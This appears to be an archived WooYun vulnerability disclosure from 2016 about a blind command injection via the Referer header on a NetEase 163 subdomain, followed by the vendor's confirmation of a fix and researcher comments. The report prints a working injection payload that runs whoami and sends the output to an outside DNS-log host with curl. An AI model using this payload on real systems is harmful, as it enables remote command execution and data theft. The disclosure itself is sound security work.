{"id": 87000, "wybug_id": "wooyun-2016-0192038", "wybug_title": "网易163某站点存在隐式命令注入", "wybug_corp": "网易", "wybug_author": "lijiejie", "wybug_date": "2016-04-03 11:19", "wybug_open_date": "2016-05-22 13:40", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "14", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-04-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-04-07：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-22：\t细节向公众公开  简要描述： 网易163某站点存在隐式命令注入，可远程执行任意Linux命令 详细说明：  存在命令注入的是paopao.163.com的Referer，怀疑是某个日志分析服务的问题：\nGET /search/sycProduct HTTP/1.1Referer: $(curl http://paopao3.xxxx.dnslog.info/?whoami=`whoami`)User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13D15 MicroMessenger/6.3.13 NetType/WIFI Language/enHost: www.paopao.163.comAccept-Encoding: gzip,deflateAccept: */*\n上面我注入了curl和whoami命令。这个地方并不会马上导致命令执行，而是每天凌晨大约0点到2点钟被执行到。   漏洞证明：  \n\n如上图所示，实际上paopao3和163这个子域名都被成功打回了。whoami命令也被成功执行了，当前用户是appops：\n[03/Apr/2016:00:57:22 +0800] 223.252.218.194 - - paopao3.xxxx.dnslog.info GET /?whoami=appops HTTP/1.1 200 \"curl/7.26.0\" \"-\"\n\n\n   修复方案：  过滤，比如去掉$(和`符号   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-04-07 13:37 厂商回复： 漏洞已修复，感谢您对网易的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-04-03 11:21 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:840 漏洞数:155        | raw_input(\"你知道我要输入什么？\"))\t\t \n  666    \n     2016-04-03 11:26 |    \t\tExploit DB \t\t\t( 普通白帽子  |\t\t\t        Rank:475 漏洞数:132        | 水能载舟，亦可覆舟)\t\t \n  李姐姐 能不能告诉我什么叫隐式命令注入 新姿势想学习下...    \n     2016-04-03 11:34 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:162 漏洞数:65        | 我要是再正常一点就好了)\t\t \n  马克，坐等公开    \n     2016-04-03 11:50 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:16        | Talk is cheap,show me the shell.)\t\t \n  无回显    \n     2016-04-03 12:40 |    \t\tArcticWolf \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:34        | 呃···是AW！不是AV！)\t\t \n  mark    \n     2016-04-03 13:56 |    \t\tucifer \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:74        | 萌萌哒~)\t\t \n  命令盲注    \n     2016-04-03 14:18 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:22        | 当我又回首一切,这个世界会好吗?)\t\t \n  日了狗    \n     2016-04-03 14:33 |    \t\t冷白开。 \t\t\t( 普通白帽子  |\t\t\t        Rank:249 漏洞数:99        | “想人想的厉害的时候，也是淡淡的。    ...)\t\t \n  啥叫隐式命令注入，求科普    \n     2016-04-03 16:02 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  ...漏洞大把    \n     2016-04-03 16:21 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1621 漏洞数:221        | 。)\t\t \n  不回显吗？    \n     2016-04-03 16:30 |    \t\tCode Life \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:40        | Code Life,Join It!)\t\t \n  感觉又有52G的库    \n     2016-04-03 17:34 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  看标题就觉得很屌！    \n     2016-04-04 11:38 |    \t\tCan \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:36        | 我是水一样的男子，因为党说我是流动人口。)\t\t \n  @xsser 大哥能去审核一下我的漏洞吗？乌云就这个效率吗    \n     2016-04-04 12:17 |    \t\tExploit DB \t\t\t( 普通白帽子  |\t\t\t        Rank:475 漏洞数:132        | 水能载舟，亦可覆舟)\t\t \n  @Can 首先你的漏洞必须是高危害 之前川神在群里说过一句话 渣渣漏洞就不要催审核了     \n     2016-04-04 12:41 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:16        | Talk is cheap,show me the shell.)\t\t \n  @Can 急啥…    \n     2016-04-04 14:01 |    \t\tCode Life \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:40        | Code Life,Join It!)\t\t \n  不急不急 春节那一天虽然漏洞冻结了 但我的一个漏洞还是在半个小时后审核通过 但有一次一个政府网站的sql审核了一个月 @Can    \n     2016-04-04 17:17 |    \t\tYangCL \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:8        | 最温馨的游戏社区)\t\t \n  @Exploit DB MySQL隐形的类型    \n     2016-04-04 17:39 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:840 漏洞数:155        | raw_input(\"你知道我要输入什么？\"))\t\t \n  估计是 Http响应一类的http request    \n     2016-04-05 09:13 |    \t\t追寻 \t\t\t( 普通白帽子  |\t\t\t        Rank:210 漏洞数:46        | 学习新姿势中)\t\t \n  mark     \n     2016-04-07 15:37 |    \t\tsauce \t\t\t( 普通白帽子  |\t\t\t        Rank:228 漏洞数:38        | test)\t\t \n  修复了赶紧公开看看啊@网易    \n     2016-04-07 16:01 |    \t\tsysALong \t\t\t( 普通白帽子  |\t\t\t        Rank:360 漏洞数:72        | 在我们黑龙江这噶哒，就没有什么事是【撸串...)\t\t \n   哥哥我只要一回复，上面的一群人还有关注的人都会收到提示信息！！！    \n     2016-04-17 11:15 |    \t\t蓝冰 \t\t\t( 普通白帽子  |\t\t\t        Rank:725 漏洞数:61        | -.-)\t\t \n  为何受伤的总是网易。    \n     2016-05-22 13:57 |    \t\tYiYang \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:14        | 一锹、两锹、三锹。。。)\t\t \n  是什么原理啊 怎么发现呢    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}